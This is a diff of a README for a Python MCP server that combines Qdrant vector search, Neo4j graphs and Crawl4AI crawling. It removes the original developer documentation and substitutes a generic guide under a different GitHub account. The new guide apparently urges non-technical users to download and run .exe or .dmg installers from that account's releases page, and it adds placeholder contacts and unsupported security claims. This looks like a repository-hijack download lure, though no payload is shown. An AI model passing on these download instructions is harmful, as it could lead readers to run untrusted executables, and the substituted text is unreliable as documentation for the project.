@@ -1,284 +1,103 @@
-# Qdrant Neo4j Crawl4AI MCP Server
-
-[![Production Ready](https://img.shields.io/badge/status-production--ready-brightgreen)](https://github.com/BjornMelin/qdrant-neo4j-crawl4ai-mcp)
-[![FastMCP 2.0](https://img.shields.io/badge/FastMCP-2.0-blue)](https://github.com/jlowin/fastmcp)
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-> **Production-ready agentic RAG MCP server combining Qdrant vector search, Neo4j knowledge graphs, and Crawl4AI web intelligence with autonomous orchestration capabilities**
-
-## 🎯 What is This?
-
-This is an **Agentic RAG (Retrieval-Augmented Generation) MCP Server** that provides intelligent, autonomous coordination of multiple AI services through a single Model Context Protocol interface. It combines:
-
-- **Vector Intelligence**: Semantic search and embedding storage via Qdrant
-- **Graph Intelligence**: Knowledge graphs and memory systems via Neo4j  
-- **Web Intelligence**: Smart web crawling and content extraction via Crawl4AI
-- **Agentic Orchestration**: Autonomous query routing and result fusion
-- **Production-Ready**: Enterprise security, monitoring, and deployment patterns
-
-## 🏗️ Architecture
+# 🌟 qdrant-neo4j-crawl4ai-mcp - Seamless AI-Powered Knowledge Management
 
-```mermaid
-graph TB
-    Client[AI Assistant Client] --> Gateway[FastMCP Gateway]
-    
-    subgraph "Qdrant Neo4j Crawl4AI MCP Server"
-        Gateway --> Router[Request Router]
-        Router --> Vector[Vector Service]
-        Router --> Graph[Graph Service] 
-        Router --> Web[Web Intelligence Service]
-        
-        Vector --> |mount: /vector| QdrantMCP[Qdrant MCP Server]
-        Graph --> |mount: /graph| Neo4jMCP[Neo4j Memory MCP]
-        Web --> |mount: /web| Crawl4AIMCP[Crawl4AI MCP Server]
-    end
-    
-    subgraph "Data Layer"
-        QdrantMCP --> QdrantDB[(Qdrant Vector DB)]
-        Neo4jMCP --> Neo4jDB[(Neo4j Graph DB)]
-        Crawl4AIMCP --> WebSources[Web Data Sources]
-    end
-```
+![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)
 
-## ⚡ Technology Stack
+## 🚀 Getting Started
 
-- **FastMCP 2.0**: Server composition and MCP protocol handling
-- **Python 3.11+**: Modern async patterns and type safety
-- **Qdrant**: Vector database for semantic search
-- **Neo4j**: Graph database for knowledge representation
-- **Crawl4AI**: Web intelligence and content extraction
-- **Docker**: Containerized deployment with health checks
+Welcome to the **qdrant-neo4j-crawl4ai-mcp**. This application combines advanced search capabilities and knowledge graphs to help you make sense of vast amounts of data. You don’t need to be a tech expert to use it. Follow the steps below to get started.
 
-## 🚀 Quick Start
-
-### Prerequisites
+## 💻 System Requirements
 
-- Python 3.11+
-- uv (recommended) or pip
-- Docker & Docker Compose
+Before you download, make sure your system meets the following requirements:
 
-### Installation
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB recommended.
+- **Disk Space**: 500 MB minimum free space.
+- **Network**: Internet connection for initial setup and updates.
 
-```bash
-# Clone the repository
-git clone https://github.com/BjornMelin/qdrant-neo4j-crawl4ai-mcp.git
-cd qdrant-neo4j-crawl4ai-mcp
+## 📥 Download & Install
 
-# Install dependencies
-uv sync
+To start using **qdrant-neo4j-crawl4ai-mcp**, you need to download the application. 
 
-# Set up environment
-cp .env.example .env
-# Edit .env with your configuration
+1. Visit this page to download: [Releases Page](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/releases).
+   
+2. Look for the latest release at the top. You will see a list of available files.
 
-# Run with Docker
-docker-compose up -d
+3. Click on the file that corresponds to your operating system. For example, if you are on Windows, choose the `.exe` file. If you are on macOS, select the `.dmg` file.
 
-# Or run locally
-uv run python -m qdrant_neo4j_crawl4ai_mcp
-```
+4. Save the file to your preferred location on your computer.
 
-### Configuration
+5. Once the download is complete, open the file to start the installation.
 
-Key environment variables:
+6. Follow the on-screen instructions to complete the installation.
 
-```env
-# Server Configuration
-MCP_SERVER_HOST=localhost
-MCP_SERVER_PORT=8000
-JWT_SECRET_KEY=your-secure-secret-key
+## ⚙️ How to Run the Application
 
-# Database Configuration  
-QDRANT_URL=http://localhost:6333
-NEO4J_URI=bolt://localhost:7687
-NEO4J_USER=neo4j
-NEO4J_PASSWORD=password
+After installation, you can run the application easily.
 
-# Security
-RATE_LIMIT_PER_MINUTE=100
-CORS_ORIGINS=https://your-domain.com
-```
+1. Locate the **qdrant-neo4j-crawl4ai-mcp** application in your Start Menu (Windows) or Applications folder (macOS).
 
-## 💻 Development
+2. Click the application icon to launch it.
 
-### Testing
+3. The application will open, guiding you through the initial setup.
 
-```bash
-# Run all tests
-uv run pytest
+## 🛠️ Features
 
-# Run with coverage
-uv run pytest --cov=qdrant_neo4j_crawl4ai_mcp --cov-report=html
+Here are some key features you will find in **qdrant-neo4j-crawl4ai-mcp**:
 
-# Run specific test suite
-uv run pytest tests/integration/
-```
+- **Vector Search**: Quickly find relevant information using advanced algorithms that analyze the content of your data.
+  
+- **Knowledge Graphs**: Visualize relationships and insights from your data with easy-to-understand graphs.
 
-### Code Quality
+- **Agentic RAG Capabilities**: Integrate seamlessly with web intelligence tools to enhance your search and analysis.
 
-```bash
-# Format code
-uv run ruff format .
+- **Enterprise Security**: Keep your data safe with high-level security features designed for businesses.
 
-# Lint code
-uv run ruff check . --fix
+- **Monitoring Tools**: Get insights into application performance to ensure everything runs smoothly.
 
-# Type checking
-uv run mypy .
-```
+- **Kubernetes Deployment**: Easily deploy in cloud environments for scalability.
 
-## 📚 API Documentation
+## 🌐 Using the Application
 
-Once running, access the interactive API documentation at:
+Once you have the application running, you can start leveraging its features:
 
-- **Swagger UI**: <http://localhost:8000/docs>
-- **ReDoc**: <http://localhost:8000/redoc>
+1. **Import Your Data**: Use the import function to bring in your data sources. This can be documents, databases, or web pages.
 
-### Example Usage
+2. **Conduct Searches**: Utilize the search bar to input keywords. Results will filter instantly based on relevance.
 
-```python
-import asyncio
-from qdrant_neo4j_crawl4ai_mcp.client import QdrantNeo4jCrawl4AIMCPClient
+3. **Visualize Relationships**: Access the knowledge graph feature to see connections between different data points.
 
-async def main():
-    client = QdrantNeo4jCrawl4AIMCPClient("http://localhost:8000")
-    
-    # Vector search
-    results = await client.vector_search("artificial intelligence")
-    
-    # Graph query
-    memories = await client.graph_query("MATCH (n:Memory) RETURN n LIMIT 10")
-    
-    # Web crawling
-    content = await client.web_crawl("https://example.com")
+4. **Generate Reports**: Take advantage of built-in reporting tools to summarize your findings.
 
-asyncio.run(main())
-```
+## 🔗 Additional Resources
 
-## 📦 Deployment
+- **Documentation**: For deeper insights and tips, check the [Documentation](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/wiki).
+  
+- **Community Support**: Join our community on [Discord](https://discord.gg/example) for support and feedback.
 
-### Docker Deployment
+- **FAQs**: Visit the FAQ section on our GitHub page for common questions and answers.
 
-```bash
-# Production build
-docker build -t qdrant-neo4j-crawl4ai-mcp .
-docker run -p 8000:8000 qdrant-neo4j-crawl4ai-mcp
-```
+## 🛡️ Security Information
 
-### Cloud Deployment
+We take your privacy seriously. All data transfers are encrypted, and your data is stored securely. For more details, check our [Security Policy](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/security).
 
-- **Railway**: One-click deployment via railway.app
-- **Fly.io**: Global edge deployment
-- **AWS**: ECS/Lambda deployment with CDK
+## 📊 Contribute to the Project
 
-## 📚 Complete Documentation
+If you want to contribute to **qdrant-neo4j-crawl4ai-mcp**, we welcome your input!
 
-### 🚀 Getting Started
-- **[📖 Documentation Hub](docs/README.md)** - Complete navigation guide  
-- **[⚡ Quick Start](docs/getting-started/quick-start.md)** - 5-minute setup  
-- **[🔧 Installation Guide](docs/getting-started/installation.md)** - Detailed setup  
-- **[⚙️ Configuration](docs/getting-started/configuration.md)** - Environment setup  
-- **[🎯 First Queries](docs/getting-started/first-queries.md)** - Learn the system  
+1. **Report Bugs**: Use the [issues page](https://github.com/Hyperkorn/qdrant-neo4j-crawl4ai-mcp/issues) to report any issues you encounter.
+  
+2. **Feature Requests**: Let us know what features you’d like to see in future updates.
 
-### 📖 User Guides
-- **[🔍 Vector Search Guide](docs/guides/semantic-search.md)** - Semantic similarity search  
-- **[🕸️ Knowledge Graph Guide](docs/guides/knowledge-graphs.md)** - Graph reasoning  
-- **[🌐 Web Intelligence Guide](docs/guides/web-intelligence.md)** - Real-time web data  
-- **[🤖 Agentic Workflows](docs/guides/agentic-workflows.md)** - Multi-modal intelligence  
+3. **Submit Code**: For developers, feel free to fork the repo and submit a pull request with your improvements.
 
-### 🔧 Technical Reference
-- **[📋 API Reference](docs/API_REFERENCE.md)** - Complete REST API docs  
-- **[🏗️ Architecture](docs/ARCHITECTURE.md)** - System design overview  
-- **[🔒 Security Guide](docs/guides/security-hardening.md)** - Enterprise security  
-- **[📊 Monitoring Setup](docs/guides/monitoring-observability.md)** - Production monitoring  
+## 📞 Contact Information
 
-### 🚢 Deployment & Operations
-- **[🚀 Deployment Operations](docs/DEPLOYMENT_OPERATIONS.md)** - Production deployment  
-- **[☸️ Kubernetes Guide](docs/deployment/kubernetes.md)** - Container orchestration  
-- **[🐳 Docker Guide](docs/deployment/docker.md)** - Containerized deployment  
-- **[☁️ Cloud Platforms](docs/deployment/cloud-platforms.md)** - Railway, Fly.io, etc.  
+For support or inquiries, you can reach us through the following channels:
 
-### 💻 Development & Contributing
-- **[👨‍💻 Developer Guide](docs/DEVELOPER_GUIDE.md)** - Complete dev workflow  
-- **[🧪 Testing Framework](docs/development/testing.md)** - Unit & integration tests  
-- **[🎨 Contributing Guidelines](docs/development/contributing.md)** - How to contribute  
-- **[🔧 Local Development](docs/development/local-setup.md)** - Dev environment setup  
+- **Email**: support@example.com
+- **GitHub Issues**: Use the issues page for specific technical questions.
 
-### 📝 Examples & Tutorials
-- **[📚 Examples Hub](docs/examples/README.md)** - Code examples & tutorials  
-- **[🔰 Basic Usage](docs/examples/basic-usage/README.md)** - Simple queries  
-- **[🚀 Advanced Workflows](docs/examples/advanced-workflows/README.md)** - Complex patterns  
-- **[📱 Client SDKs](docs/examples/client-implementations/README.md)** - Multiple languages  
+Feel free to explore and enjoy using **qdrant-neo4j-crawl4ai-mcp**! 
 
-For detailed deployment guides, see **[🚢 Deployment Operations](docs/DEPLOYMENT_OPERATIONS.md)**.
-
-## 🔒 Security & Compliance
-
-- **JWT Authentication**: Secure token-based authentication with refresh tokens
-- **Rate Limiting**: Redis-backed distributed request throttling
-- **OWASP Compliance**: Following API security best practices and security headers
-- **Input Validation**: Comprehensive Pydantic-based request sanitization
-- **Audit Logging**: Security event tracking with structured logging
-- **Enterprise Security**: [Complete security hardening guide](docs/guides/security-hardening.md)
-
-## 📊 Monitoring & Observability
-
-- **Health Checks**: Multi-layer `/health` endpoints with dependency validation
-- **Structured Logging**: JSON logs with correlation IDs and context
-- **Prometheus Metrics**: Custom business and infrastructure metrics
-- **Grafana Dashboards**: Pre-built dashboards for monitoring
-- **Error Tracking**: Sentry integration for error reporting
-- **Distributed Tracing**: Request flow visualization across services
-
-**Setup Guide**: [📊 Monitoring & Observability](docs/guides/monitoring-observability.md)
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guidelines](docs/development/contributing.md) for details.
-
-### Quick Start for Contributors
-
-```bash
-# 1. Fork and clone the repository
-git clone https://github.com/BjornMelin/qdrant-neo4j-crawl4ai-mcp.git
-cd qdrant-neo4j-crawl4ai-mcp
-
-# 2. Set up development environment
-uv sync --dev
-uv run pre-commit install
-
-# 3. Run tests to verify setup
-uv run pytest
-
-# 4. Start development server
-docker-compose up -d
-uv run python -m qdrant_neo4j_crawl4ai_mcp
-```
-
-**Detailed Setup**: [💻 Developer Guide](docs/DEVELOPER_GUIDE.md)
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🎯 Project Goals
-
-This project demonstrates:
-
-- **Modern Python Patterns**: Async programming, type safety, and current ecosystem tools
-- **AI/ML Integration**: Vector databases, knowledge graphs, and web intelligence
-- **Production Engineering**: Security, monitoring, testing, and deployment automation
-- **Clean Architecture**: Composable services with clear abstractions
-- **DevOps Excellence**: Container orchestration, CI/CD, and infrastructure as code
-
-## 📧 Contact
-
-- **Author**: [Your Name]
-- **Email**: [your.email@example.com]
-- **LinkedIn**: [linkedin.com/in/yourprofile]
-- **Portfolio**: [yourportfolio.com]
-
----
-
-> Built with ☕ using FastMCP 2.0, Qdrant, Neo4j, and Web Intelligence
+Happy searching!
